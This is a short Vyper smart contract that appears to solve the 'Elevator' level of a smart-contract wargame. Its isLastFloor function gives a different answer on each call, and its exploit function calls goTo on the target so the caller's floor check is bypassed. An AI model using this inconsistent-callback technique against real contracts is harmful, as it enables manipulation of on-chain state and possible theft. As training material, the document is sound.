# @version 0.3.3

interface elevator:
    def goTo(_floor: uint256): nonpayable


first: bool

@external
def isLastFloor(_floor: uint256) -> (bool):
    if (not self.first):
       self.first = True
       return False
    else:
        return True

@external
def exploit(instance: address):
    elevator(instance).goTo(1)
